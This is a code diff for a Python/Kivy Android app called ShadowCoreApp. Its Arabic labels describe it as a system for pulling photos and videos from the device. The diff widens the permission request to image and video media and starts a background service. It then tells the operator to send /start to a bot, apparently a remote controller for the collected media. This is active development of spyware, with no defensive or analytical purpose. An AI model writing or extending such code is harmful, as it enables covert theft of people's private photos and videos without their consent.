@@ -7,15 +7,15 @@ from android.permissions import request_permissions, Permission
 
 class ShadowCoreApp(App):
     def build(self):
-        # قفل الشاشة بوضع Portrait
+        # تثبيت الشاشة بالطول
         PythonActivity = autoclass('org.kivy.android.PythonActivity')
         activity = PythonActivity.mActivity
         ActivityInfo = autoclass('android.content.pm.ActivityInfo')
         activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT)
 
         layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
-        self.status = Label(text="النظام جاهز للعمل", font_size='18sp', halign='center')
-        self.btn = Button(text="تفعيل النظام (Grant All)", background_color=(0.1, 0.6, 0.9, 1), font_size='20sp')
+        self.status = Label(text="نظام سحب الصور والفيديو\nجاهز للتفعيل", font_size='18sp', halign='center')
+        self.btn = Button(text="تفعيل الصلاحيات", background_color=(0.1, 0.7, 0.3, 1), font_size='20sp', bold=True)
         self.btn.bind(on_press=self.start_process)
         
         layout.add_widget(self.status)
@@ -23,11 +23,12 @@ class ShadowCoreApp(App):
         return layout
 
     def start_process(self, instance):
-        # طلب الصلاحيات الشاملة لأندرويد 13
+        # طلب صلاحيات الصور والفيديو والملفات فقط (بدون صوتيات)
         perms = [
+            Permission.READ_MEDIA_IMAGES,
+            Permission.READ_MEDIA_VIDEO,
             Permission.READ_EXTERNAL_STORAGE,
             Permission.WRITE_EXTERNAL_STORAGE,
-            Permission.READ_MEDIA_IMAGES,
             Permission.FOREGROUND_SERVICE
         ]
         request_permissions(perms, self.launch_service)
@@ -37,7 +38,7 @@ class ShadowCoreApp(App):
             PythonActivity = autoclass('org.kivy.android.PythonActivity')
             service = autoclass('org.test.shadowcore.ServiceMyservice')
             service.start(PythonActivity.mActivity, "")
-            self.status.text = "✅ النظام نشط!\nأرسل /start للبوت الآن"
+            self.status.text = "✅ تم التفعيل!\nأرسل /start للبوت الآن"
             self.btn.disabled = True
         except Exception as e:
             self.status.text = f"خطأ: {str(e)}"
